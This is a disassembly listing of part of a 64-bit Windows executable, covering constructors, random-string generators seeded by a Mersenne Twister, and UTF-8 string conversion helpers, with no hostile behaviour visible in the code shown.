   140001d0f:	48 89 03             	mov    %rax,(%rbx)
   140001d12:	48 8b c3             	mov    %rbx,%rax
   140001d15:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   140001d1a:	48 83 c4 60          	add    $0x60,%rsp
   140001d1e:	5b                   	pop    %rbx
   140001d1f:	c3                   	ret
   140001d20:	e8 fb 30 01 00       	call   0x140014e20
   140001d25:	cc                   	int3
   140001d26:	cc                   	int3
   140001d27:	cc                   	int3
   140001d28:	cc                   	int3
   140001d29:	cc                   	int3
   140001d2a:	cc                   	int3
   140001d2b:	cc                   	int3
   140001d2c:	cc                   	int3
   140001d2d:	cc                   	int3
   140001d2e:	cc                   	int3
   140001d2f:	cc                   	int3
   140001d30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001d35:	57                   	push   %rdi
   140001d36:	48 83 ec 20          	sub    $0x20,%rsp
   140001d3a:	48 8b da             	mov    %rdx,%rbx
   140001d3d:	48 8d 05 fc e8 02 00 	lea    0x2e8fc(%rip),%rax        # 0x140030640
   140001d44:	48 89 01             	mov    %rax,(%rcx)
   140001d47:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   140001d4b:	48 8b f9             	mov    %rcx,%rdi
   140001d4e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001d51:	0f 11 02             	movups %xmm0,(%rdx)
   140001d54:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140001d58:	e8 6b 9c 00 00       	call   0x14000b9c8
   140001d5d:	48 8d 05 3c e9 02 00 	lea    0x2e93c(%rip),%rax        # 0x1400306a0
   140001d64:	48 89 07             	mov    %rax,(%rdi)
   140001d67:	48 8d 05 ba e2 03 00 	lea    0x3e2ba(%rip),%rax        # 0x140040028
   140001d6e:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   140001d72:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001d77:	48 89 07             	mov    %rax,(%rdi)
   140001d7a:	48 8b c7             	mov    %rdi,%rax
   140001d7d:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   140001d81:	48 83 c4 20          	add    $0x20,%rsp
   140001d85:	5f                   	pop    %rdi
   140001d86:	c3                   	ret
   140001d87:	cc                   	int3
   140001d88:	cc                   	int3
   140001d89:	cc                   	int3
   140001d8a:	cc                   	int3
   140001d8b:	cc                   	int3
   140001d8c:	cc                   	int3
   140001d8d:	cc                   	int3
   140001d8e:	cc                   	int3
   140001d8f:	cc                   	int3
   140001d90:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001d95:	57                   	push   %rdi
   140001d96:	48 83 ec 20          	sub    $0x20,%rsp
   140001d9a:	8b da                	mov    %edx,%ebx
   140001d9c:	48 8b f9             	mov    %rcx,%rdi
   140001d9f:	48 8d 05 62 e1 03 00 	lea    0x3e162(%rip),%rax        # 0x14003ff08
   140001da6:	48 89 01             	mov    %rax,(%rcx)
   140001da9:	e8 fe 71 00 00       	call   0x140008fac
   140001dae:	90                   	nop
   140001daf:	f6 c3 01             	test   $0x1,%bl
   140001db2:	74 0d                	je     0x140001dc1
   140001db4:	ba 48 00 00 00       	mov    $0x48,%edx
   140001db9:	48 8b cf             	mov    %rdi,%rcx
   140001dbc:	e8 9f 80 00 00       	call   0x140009e60
   140001dc1:	48 8b c7             	mov    %rdi,%rax
   140001dc4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001dc9:	48 83 c4 20          	add    $0x20,%rsp
   140001dcd:	5f                   	pop    %rdi
   140001dce:	c3                   	ret
   140001dcf:	cc                   	int3
   140001dd0:	48 83 ec 28          	sub    $0x28,%rsp
   140001dd4:	83 79 08 00          	cmpl   $0x0,0x8(%rcx)
   140001dd8:	75 05                	jne    0x140001ddf
   140001dda:	48 83 c4 28          	add    $0x28,%rsp
   140001dde:	c3                   	ret
   140001ddf:	e8 ec 1a 01 00       	call   0x1400138d0
   140001de4:	cc                   	int3
   140001de5:	cc                   	int3
   140001de6:	cc                   	int3
   140001de7:	cc                   	int3
   140001de8:	cc                   	int3
   140001de9:	cc                   	int3
   140001dea:	cc                   	int3
   140001deb:	cc                   	int3
   140001dec:	cc                   	int3
   140001ded:	cc                   	int3
   140001dee:	cc                   	int3
   140001def:	cc                   	int3
   140001df0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001df5:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   140001dfa:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001dff:	56                   	push   %rsi
   140001e00:	57                   	push   %rdi
   140001e01:	41 54                	push   %r12
   140001e03:	41 56                	push   %r14
   140001e05:	41 57                	push   %r15
   140001e07:	b8 e0 13 00 00       	mov    $0x13e0,%eax
   140001e0c:	e8 bf 86 00 00       	call   0x14000a4d0
   140001e11:	48 2b e0             	sub    %rax,%rsp
   140001e14:	48 8b f1             	mov    %rcx,%rsi
   140001e17:	45 33 e4             	xor    %r12d,%r12d
   140001e1a:	44 89 64 24 20       	mov    %r12d,0x20(%rsp)
   140001e1f:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   140001e24:	4c 89 64 24 38       	mov    %r12,0x38(%rsp)
   140001e29:	48 c7 44 24 40 07 00 	movq   $0x7,0x40(%rsp)
   140001e30:	00 00 
   140001e32:	66 44 89 64 24 28    	mov    %r12w,0x28(%rsp)
   140001e38:	45 8d 44 24 24       	lea    0x24(%r12),%r8d
   140001e3d:	48 8d 15 dc d1 03 00 	lea    0x3d1dc(%rip),%rdx        # 0x14003f020
   140001e44:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140001e49:	e8 b2 47 00 00       	call   0x140006600
   140001e4e:	90                   	nop
   140001e4f:	4c 89 26             	mov    %r12,(%rsi)
   140001e52:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   140001e56:	48 c7 46 18 07 00 00 	movq   $0x7,0x18(%rsi)
   140001e5d:	00 
   140001e5e:	66 44 89 26          	mov    %r12w,(%rsi)
   140001e62:	bb 01 00 00 00       	mov    $0x1,%ebx
   140001e67:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   140001e6b:	41 be 15 00 00 00    	mov    $0x15,%r14d
   140001e71:	41 8b d6             	mov    %r14d,%edx
   140001e74:	48 8b ce             	mov    %rsi,%rcx
   140001e77:	e8 a4 58 00 00       	call   0x140007720
   140001e7c:	4c 89 66 10          	mov    %r12,0x10(%rsi)
   140001e80:	33 c9                	xor    %ecx,%ecx
   140001e82:	e8 11 23 01 00       	call   0x140014198
   140001e87:	c7 84 24 d4 13 00 00 	movl   $0xffffffff,0x13d4(%rsp)
   140001e8e:	ff ff ff ff 
   140001e92:	89 44 24 54          	mov    %eax,0x54(%rsp)
   140001e96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140001e9d:	00 00 00 
   140001ea0:	8b c8                	mov    %eax,%ecx
   140001ea2:	c1 e9 1e             	shr    $0x1e,%ecx
   140001ea5:	33 c8                	xor    %eax,%ecx
   140001ea7:	69 c9 65 89 07 6c    	imul   $0x6c078965,%ecx,%ecx
   140001ead:	03 cb                	add    %ebx,%ecx
   140001eaf:	89 4c 9c 54          	mov    %ecx,0x54(%rsp,%rbx,4)
   140001eb3:	8b c1                	mov    %ecx,%eax
   140001eb5:	48 ff c3             	inc    %rbx
   140001eb8:	48 81 fb 70 02 00 00 	cmp    $0x270,%rbx
   140001ebf:	72 df                	jb     0x140001ea0
   140001ec1:	c7 44 24 50 70 02 00 	movl   $0x270,0x50(%rsp)
   140001ec8:	00 
   140001ec9:	8b 5c 24 38          	mov    0x38(%rsp),%ebx
   140001ecd:	ff cb                	dec    %ebx
   140001ecf:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   140001ed4:	48 8b 6c 24 28       	mov    0x28(%rsp),%rbp
   140001ed9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001ee0:	83 fb ff             	cmp    $0xffffffff,%ebx
   140001ee3:	75 0e                	jne    0x140001ef3
   140001ee5:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001eea:	e8 b1 64 00 00       	call   0x1400083a0
   140001eef:	8b d0                	mov    %eax,%edx
   140001ef1:	eb 3e                	jmp    0x140001f31
   140001ef3:	8d 7b 01             	lea    0x1(%rbx),%edi
   140001ef6:	41 8b cc             	mov    %r12d,%ecx
   140001ef9:	41 8b c4             	mov    %r12d,%eax
   140001efc:	85 db                	test   %ebx,%ebx
   140001efe:	74 11                	je     0x140001f11
   140001f00:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001f05:	e8 96 64 00 00       	call   0x1400083a0
   140001f0a:	8b c8                	mov    %eax,%ecx
   140001f0c:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140001f11:	33 d2                	xor    %edx,%edx
   140001f13:	f7 f7                	div    %edi
   140001f15:	44 8b ca             	mov    %edx,%r9d
   140001f18:	44 8b c0             	mov    %eax,%r8d
   140001f1b:	33 d2                	xor    %edx,%edx
   140001f1d:	8b c1                	mov    %ecx,%eax
   140001f1f:	f7 f7                	div    %edi
   140001f21:	41 3b c0             	cmp    %r8d,%eax
   140001f24:	72 05                	jb     0x140001f2b
   140001f26:	44 3b cb             	cmp    %ebx,%r9d
   140001f29:	75 cb                	jne    0x140001ef6
   140001f2b:	33 d2                	xor    %edx,%edx
   140001f2d:	8b c1                	mov    %ecx,%eax
   140001f2f:	f7 f7                	div    %edi
   140001f31:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   140001f36:	49 83 ff 08          	cmp    $0x8,%r15
   140001f3a:	48 0f 43 cd          	cmovae %rbp,%rcx
   140001f3e:	48 63 c2             	movslq %edx,%rax
   140001f41:	44 0f b7 0c 41       	movzwl (%rcx,%rax,2),%r9d
   140001f46:	48 8b 4e 10          	mov    0x10(%rsi),%rcx
   140001f4a:	48 8b 56 18          	mov    0x18(%rsi),%rdx
   140001f4e:	48 3b ca             	cmp    %rdx,%rcx
   140001f51:	73 21                	jae    0x140001f74
   140001f53:	48 8d 41 01          	lea    0x1(%rcx),%rax
   140001f57:	48 89 46 10          	mov    %rax,0x10(%rsi)
   140001f5b:	48 8b c6             	mov    %rsi,%rax
   140001f5e:	48 83 fa 08          	cmp    $0x8,%rdx
   140001f62:	72 03                	jb     0x140001f67
   140001f64:	48 8b 06             	mov    (%rsi),%rax
   140001f67:	66 44 89 0c 48       	mov    %r9w,(%rax,%rcx,2)
   140001f6c:	66 44 89 64 48 02    	mov    %r12w,0x2(%rax,%rcx,2)
   140001f72:	eb 08                	jmp    0x140001f7c
   140001f74:	48 8b ce             	mov    %rsi,%rcx
   140001f77:	e8 14 59 00 00       	call   0x140007890
   140001f7c:	49 83 ee 01          	sub    $0x1,%r14
   140001f80:	0f 85 5a ff ff ff    	jne    0x140001ee0
   140001f86:	49 83 ff 08          	cmp    $0x8,%r15
   140001f8a:	72 31                	jb     0x140001fbd
   140001f8c:	4a 8d 14 7d 02 00 00 	lea    0x2(,%r15,2),%rdx
   140001f93:	00 
   140001f94:	48 8b c5             	mov    %rbp,%rax
   140001f97:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001f9e:	72 15                	jb     0x140001fb5
   140001fa0:	48 83 c2 27          	add    $0x27,%rdx
   140001fa4:	48 8b 6d f8          	mov    -0x8(%rbp),%rbp
   140001fa8:	48 2b c5             	sub    %rbp,%rax
   140001fab:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   140001faf:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001fb3:	77 27                	ja     0x140001fdc
   140001fb5:	48 8b cd             	mov    %rbp,%rcx
   140001fb8:	e8 a3 7e 00 00       	call   0x140009e60
   140001fbd:	48 8b c6             	mov    %rsi,%rax
   140001fc0:	4c 8d 9c 24 e0 13 00 	lea    0x13e0(%rsp),%r11
   140001fc7:	00 
   140001fc8:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   140001fcc:	49 8b 6b 40          	mov    0x40(%r11),%rbp
   140001fd0:	49 8b e3             	mov    %r11,%rsp
   140001fd3:	41 5f                	pop    %r15
   140001fd5:	41 5e                	pop    %r14
   140001fd7:	41 5c                	pop    %r12
   140001fd9:	5f                   	pop    %rdi
   140001fda:	5e                   	pop    %rsi
   140001fdb:	c3                   	ret
   140001fdc:	e8 3f 2e 01 00       	call   0x140014e20
   140001fe1:	cc                   	int3
   140001fe2:	cc                   	int3
   140001fe3:	cc                   	int3
   140001fe4:	cc                   	int3
   140001fe5:	cc                   	int3
   140001fe6:	cc                   	int3
   140001fe7:	cc                   	int3
   140001fe8:	cc                   	int3
   140001fe9:	cc                   	int3
   140001fea:	cc                   	int3
   140001feb:	cc                   	int3
   140001fec:	cc                   	int3
   140001fed:	cc                   	int3
   140001fee:	cc                   	int3
   140001fef:	cc                   	int3
   140001ff0:	48 8b c4             	mov    %rsp,%rax
   140001ff3:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140001ff7:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140001ffb:	48 89 48 08          	mov    %rcx,0x8(%rax)
   140001fff:	57                   	push   %rdi
   140002000:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140002007:	48 8b d9             	mov    %rcx,%rbx
   14000200a:	33 f6                	xor    %esi,%esi
   14000200c:	89 74 24 20          	mov    %esi,0x20(%rsp)
   140002010:	0f 28 05 59 d0 03 00 	movaps 0x3d059(%rip),%xmm0        # 0x14003f070
   140002017:	0f 29 44 24 30       	movaps %xmm0,0x30(%rsp)
   14000201c:	0f 28 0d 5d d0 03 00 	movaps 0x3d05d(%rip),%xmm1        # 0x14003f080
   140002023:	0f 29 48 88          	movaps %xmm1,-0x78(%rax)
   140002027:	0f 28 05 62 d0 03 00 	movaps 0x3d062(%rip),%xmm0        # 0x14003f090
   14000202e:	0f 29 40 98          	movaps %xmm0,-0x68(%rax)
   140002032:	0f 28 0d 67 d0 03 00 	movaps 0x3d067(%rip),%xmm1        # 0x14003f0a0
   140002039:	0f 29 48 a8          	movaps %xmm1,-0x58(%rax)
   14000203d:	0f 28 05 6c d0 03 00 	movaps 0x3d06c(%rip),%xmm0        # 0x14003f0b0
   140002044:	0f 29 40 b8          	movaps %xmm0,-0x48(%rax)
   140002048:	0f 28 0d 71 d0 03 00 	movaps 0x3d071(%rip),%xmm1        # 0x14003f0c0
   14000204f:	0f 29 48 c8          	movaps %xmm1,-0x38(%rax)
   140002053:	0f 28 05 76 d0 03 00 	movaps 0x3d076(%rip),%xmm0        # 0x14003f0d0
   14000205a:	0f 29 40 d8          	movaps %xmm0,-0x28(%rax)
   14000205e:	f2 0f 10 0d 7a d0 03 	movsd  0x3d07a(%rip),%xmm1        # 0x14003f0e0
   140002065:	00 
   140002066:	f2 0f 11 48 e8       	movsd  %xmm1,-0x18(%rax)
   14000206b:	8b 05 77 d0 03 00    	mov    0x3d077(%rip),%eax        # 0x14003f0e8
   140002071:	89 84 24 a8 00 00 00 	mov    %eax,0xa8(%rsp)
   140002078:	0f b7 05 6d d0 03 00 	movzwl 0x3d06d(%rip),%eax        # 0x14003f0ec
   14000207f:	66 89 84 24 ac 00 00 	mov    %ax,0xac(%rsp)
   140002086:	00 
   140002087:	48 89 31             	mov    %rsi,(%rcx)
   14000208a:	48 89 71 10          	mov    %rsi,0x10(%rcx)
   14000208e:	48 c7 41 18 07 00 00 	movq   $0x7,0x18(%rcx)
   140002095:	00 
   140002096:	66 89 31             	mov    %si,(%rcx)
   140002099:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   1400020a0:	00 
   1400020a1:	33 c9                	xor    %ecx,%ecx
   1400020a3:	e8 f0 20 01 00       	call   0x140014198
   1400020a8:	48 8b c8             	mov    %rax,%rcx
   1400020ab:	e8 ac 0c 01 00       	call   0x140012d5c
   1400020b0:	8d 7e 06             	lea    0x6(%rsi),%edi
   1400020b3:	e8 78 0c 01 00       	call   0x140012d30
   1400020b8:	44 8b c0             	mov    %eax,%r8d
   1400020bb:	b8 43 08 21 84       	mov    $0x84210843,%eax
   1400020c0:	41 f7 e8             	imul   %r8d
   1400020c3:	41 03 d0             	add    %r8d,%edx
   1400020c6:	c1 fa 05             	sar    $0x5,%edx
   1400020c9:	8b ca                	mov    %edx,%ecx
   1400020cb:	c1 e9 1f             	shr    $0x1f,%ecx
   1400020ce:	03 d1                	add    %ecx,%edx
   1400020d0:	6b ca 3e             	imul   $0x3e,%edx,%ecx
   1400020d3:	44 2b c1             	sub    %ecx,%r8d
   1400020d6:	49 63 c0             	movslq %r8d,%rax
   1400020d9:	44 0f b7 4c 44 30    	movzwl 0x30(%rsp,%rax,2),%r9d
   1400020df:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   1400020e3:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   1400020e7:	48 3b ca             	cmp    %rdx,%rcx
   1400020ea:	73 20                	jae    0x14000210c
   1400020ec:	48 8d 41 01          	lea    0x1(%rcx),%rax
   1400020f0:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1400020f4:	48 8b c3             	mov    %rbx,%rax
   1400020f7:	48 83 fa 08          	cmp    $0x8,%rdx
   1400020fb:	72 03                	jb     0x140002100
   1400020fd:	48 8b 03             	mov    (%rbx),%rax
   140002100:	66 44 89 0c 48       	mov    %r9w,(%rax,%rcx,2)
   140002105:	66 89 74 48 02       	mov    %si,0x2(%rax,%rcx,2)
   14000210a:	eb 08                	jmp    0x140002114
   14000210c:	48 8b cb             	mov    %rbx,%rcx
   14000210f:	e8 7c 57 00 00       	call   0x140007890
   140002114:	48 83 ef 01          	sub    $0x1,%rdi
   140002118:	75 99                	jne    0x1400020b3
   14000211a:	48 8b c3             	mov    %rbx,%rax
   14000211d:	4c 8d 9c 24 b0 00 00 	lea    0xb0(%rsp),%r11
   140002124:	00 
   140002125:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140002129:	49 8b 73 20          	mov    0x20(%r11),%rsi
   14000212d:	49 8b e3             	mov    %r11,%rsp
   140002130:	5f                   	pop    %rdi
   140002131:	c3                   	ret
   140002132:	cc                   	int3
   140002133:	cc                   	int3
   140002134:	cc                   	int3
   140002135:	cc                   	int3
   140002136:	cc                   	int3
   140002137:	cc                   	int3
   140002138:	cc                   	int3
   140002139:	cc                   	int3
   14000213a:	cc                   	int3
   14000213b:	cc                   	int3
   14000213c:	cc                   	int3
   14000213d:	cc                   	int3
   14000213e:	cc                   	int3
   14000213f:	cc                   	int3
   140002140:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002145:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000214a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000214f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002154:	41 55                	push   %r13
   140002156:	41 56                	push   %r14
   140002158:	41 57                	push   %r15
   14000215a:	48 83 ec 60          	sub    $0x60,%rsp
   14000215e:	4c 8b f2             	mov    %rdx,%r14
   140002161:	48 8b d9             	mov    %rcx,%rbx
   140002164:	48 83 7a 10 00       	cmpq   $0x0,0x10(%rdx)
   140002169:	75 19                	jne    0x140002184
   14000216b:	33 f6                	xor    %esi,%esi
   14000216d:	48 89 31             	mov    %rsi,(%rcx)
   140002170:	48 89 71 10          	mov    %rsi,0x10(%rcx)
   140002174:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   14000217b:	00 
   14000217c:	40 88 31             	mov    %sil,(%rcx)
   14000217f:	e9 69 01 00 00       	jmp    0x1400022ed
   140002184:	4d 8b c6             	mov    %r14,%r8
   140002187:	48 83 7a 18 08       	cmpq   $0x8,0x18(%rdx)
   14000218c:	72 03                	jb     0x140002191
   14000218e:	4c 8b 02             	mov    (%rdx),%r8
   140002191:	33 f6                	xor    %esi,%esi
   140002193:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140002198:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000219d:	89 74 24 28          	mov    %esi,0x28(%rsp)
   1400021a1:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   1400021a6:	33 d2                	xor    %edx,%edx
   1400021a8:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   1400021ad:	44 8d 4e ff          	lea    -0x1(%rsi),%r9d
   1400021b1:	ff 15 d9 de 02 00    	call   *0x2ded9(%rip)        # 0x140030090
   1400021b7:	4c 63 e8             	movslq %eax,%r13
   1400021ba:	41 83 fd 01          	cmp    $0x1,%r13d
   1400021be:	7f 17                	jg     0x1400021d7
   1400021c0:	48 89 33             	mov    %rsi,(%rbx)
   1400021c3:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   1400021c7:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   1400021ce:	00 
   1400021cf:	40 88 33             	mov    %sil,(%rbx)
   1400021d2:	e9 16 01 00 00       	jmp    0x1400022ed
   1400021d7:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400021da:	f3 0f 7f 44 24 40    	movdqu %xmm0,0x40(%rsp)
   1400021e0:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   1400021e5:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400021ec:	ff ff 7f 
   1400021ef:	4c 3b e8             	cmp    %rax,%r13
   1400021f2:	0f 87 23 01 00 00    	ja     0x14000231b
   1400021f8:	49 81 fd 00 10 00 00 	cmp    $0x1000,%r13
   1400021ff:	72 29                	jb     0x14000222a
   140002201:	49 8d 4d 27          	lea    0x27(%r13),%rcx
   140002205:	49 3b cd             	cmp    %r13,%rcx
   140002208:	0f 86 01 01 00 00    	jbe    0x14000230f
   14000220e:	e8 55 7c 00 00       	call   0x140009e68
   140002213:	48 85 c0             	test   %rax,%rax
   140002216:	0f 84 f9 00 00 00    	je     0x140002315
   14000221c:	48 8d 78 27          	lea    0x27(%rax),%rdi
   140002220:	48 83 e7 e0          	and    $0xffffffffffffffe0,%rdi
   140002224:	48 89 47 f8          	mov    %rax,-0x8(%rdi)
   140002228:	eb 0b                	jmp    0x140002235
   14000222a:	49 8b cd             	mov    %r13,%rcx
   14000222d:	e8 36 7c 00 00       	call   0x140009e68
   140002232:	48 8b f8             	mov    %rax,%rdi
   140002235:	48 89 7c 24 40       	mov    %rdi,0x40(%rsp)
   14000223a:	4a 8d 2c 2f          	lea    (%rdi,%r13,1),%rbp
   14000223e:	48 89 6c 24 50       	mov    %rbp,0x50(%rsp)
   140002243:	4d 8b c5             	mov    %r13,%r8
   140002246:	33 d2                	xor    %edx,%edx
   140002248:	48 8b cf             	mov    %rdi,%rcx
   14000224b:	e8 40 a1 00 00       	call   0x14000c390
   140002250:	48 89 6c 24 48       	mov    %rbp,0x48(%rsp)
   140002255:	49 83 7e 18 08       	cmpq   $0x8,0x18(%r14)
   14000225a:	72 03                	jb     0x14000225f
   14000225c:	4d 8b 36             	mov    (%r14),%r14
   14000225f:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140002264:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   140002269:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   14000226e:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002273:	41 b9 ff ff ff ff    	mov    $0xffffffff,%r9d
   140002279:	4d 8b c6             	mov    %r14,%r8
   14000227c:	33 d2                	xor    %edx,%edx
   14000227e:	b9 e9 fd 00 00       	mov    $0xfde9,%ecx
   140002283:	ff 15 07 de 02 00    	call   *0x2de07(%rip)        # 0x140030090
   140002289:	41 8d 45 ff          	lea    -0x1(%r13),%eax
   14000228d:	4c 63 c0             	movslq %eax,%r8
   140002290:	4c 03 c7             	add    %rdi,%r8
   140002293:	48 89 33             	mov    %rsi,(%rbx)
   140002296:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   14000229a:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   1400022a1:	00 
   1400022a2:	c6 03 00             	movb   $0x0,(%rbx)
   1400022a5:	49 3b f8             	cmp    %r8,%rdi
   1400022a8:	74 0f                	je     0x1400022b9
   1400022aa:	4c 2b c7             	sub    %rdi,%r8
   1400022ad:	48 8b d7             	mov    %rdi,%rdx
   1400022b0:	48 8b cb             	mov    %rbx,%rcx
   1400022b3:	e8 98 45 00 00       	call   0x140006850
   1400022b8:	90                   	nop
   1400022b9:	48 85 ff             	test   %rdi,%rdi
   1400022bc:	74 2f                	je     0x1400022ed
   1400022be:	48 2b ef             	sub    %rdi,%rbp
   1400022c1:	48 81 fd 00 10 00 00 	cmp    $0x1000,%rbp
   1400022c8:	72 18                	jb     0x1400022e2
   1400022ca:	48 83 c5 27          	add    $0x27,%rbp
   1400022ce:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   1400022d2:	48 2b f9             	sub    %rcx,%rdi
   1400022d5:	48 8d 47 f8          	lea    -0x8(%rdi),%rax
   1400022d9:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400022dd:	77 36                	ja     0x140002315
   1400022df:	48 8b f9             	mov    %rcx,%rdi
   1400022e2:	48 8b d5             	mov    %rbp,%rdx
   1400022e5:	48 8b cf             	mov    %rdi,%rcx
   1400022e8:	e8 73 7b 00 00       	call   0x140009e60
   1400022ed:	48 8b c3             	mov    %rbx,%rax
   1400022f0:	4c 8d 5c 24 60       	lea    0x60(%rsp),%r11
   1400022f5:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400022f9:	49 8b 6b 28          	mov    0x28(%r11),%rbp
   1400022fd:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140002301:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   140002305:	49 8b e3             	mov    %r11,%rsp
   140002308:	41 5f                	pop    %r15
   14000230a:	41 5e                	pop    %r14
   14000230c:	41 5d                	pop    %r13
   14000230e:	c3                   	ret
   14000230f:	e8 8c ef ff ff       	call   0x1400012a0
   140002314:	cc                   	int3
   140002315:	e8 06 2b 01 00       	call   0x140014e20
   14000231a:	cc                   	int3
   14000231b:	e8 00 5e 00 00       	call   0x140008120
   140002320:	cc                   	int3
   140002321:	cc                   	int3
   140002322:	cc                   	int3
   140002323:	cc                   	int3
   140002324:	cc                   	int3
   140002325:	cc                   	int3
   140002326:	cc                   	int3
   140002327:	cc                   	int3
   140002328:	cc                   	int3
   140002329:	cc                   	int3
   14000232a:	cc                   	int3
   14000232b:	cc                   	int3
   14000232c:	cc                   	int3
   14000232d:	cc                   	int3
   14000232e:	cc                   	int3
   14000232f:	cc                   	int3
   140002330:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002335:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000233a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000233f:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   140002344:	41 55                	push   %r13
   140002346:	41 56                	push   %r14
   140002348:	41 57                	push   %r15
   14000234a:	48 83 ec 60          	sub    $0x60,%rsp
   14000234e:	4c 8b f2             	mov    %rdx,%r14
   140002351:	48 8b d9             	mov    %rcx,%rbx
   140002354:	48 83 7a 10 00       	cmpq   $0x0,0x10(%rdx)
   140002359:	75 19                	jne    0x140002374
   14000235b:	33 f6                	xor    %esi,%esi
   14000235d:	48 89 31             	mov    %rsi,(%rcx)
   140002360:	48 89 71 10          	mov    %rsi,0x10(%rcx)
   140002364:	48 c7 41 18 0f 00 00 	movq   $0xf,0x18(%rcx)
   14000236b:	00 
   14000236c:	40 88 31             	mov    %sil,(%rcx)
   14000236f:	e9 63 01 00 00       	jmp    0x1400024d7
   140002374:	4d 8b c6             	mov    %r14,%r8
   140002377:	48 83 7a 18 08       	cmpq   $0x8,0x18(%rdx)
   14000237c:	72 03                	jb     0x140002381
   14000237e:	4c 8b 02             	mov    (%rdx),%r8
   140002381:	33 f6                	xor    %esi,%esi
   140002383:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   140002388:	48 89 74 24 30       	mov    %rsi,0x30(%rsp)
   14000238d:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140002391:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140002396:	33 d2                	xor    %edx,%edx
   140002398:	33 c9                	xor    %ecx,%ecx
   14000239a:	44 8d 4e ff          	lea    -0x1(%rsi),%r9d
   14000239e:	ff 15 ec dc 02 00    	call   *0x2dcec(%rip)        # 0x140030090
   1400023a4:	4c 63 e8             	movslq %eax,%r13
   1400023a7:	41 83 fd 01          	cmp    $0x1,%r13d
   1400023ab:	7f 17                	jg     0x1400023c4
   1400023ad:	48 89 33             	mov    %rsi,(%rbx)
   1400023b0:	48 89 73 10          	mov    %rsi,0x10(%rbx)
   1400023b4:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   1400023bb:	00 
   1400023bc:	40 88 33             	mov    %sil,(%rbx)
   1400023bf:	e9 13 01 00 00       	jmp    0x1400024d7
   1400023c4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400023c7:	f3 0f 7f 44 24 40    	movdqu %xmm0,0x40(%rsp)
   1400023cd:	48 89 74 24 50       	mov    %rsi,0x50(%rsp)
   1400023d2:	48 b8 ff ff ff ff ff 	movabs $0x7fffffffffffffff,%rax
   1400023d9:	ff ff 7f 
   1400023dc:	4c 3b e8             	cmp    %rax,%r13
   1400023df:	0f 87 20 01 00 00    	ja     0x140002505
   1400023e5:	49 81 fd 00 10 00 00 	cmp    $0x1000,%r13
   1400023ec:	72 29                	jb     0x140002417
   1400023ee:	49 8d 4d 27          	lea    0x27(%r13),%rcx
   1400023f2:	49 3b cd             	cmp    %r13,%rcx
   1400023f5:	0f 86 fe 00 00 00    	jbe    0x1400024f9
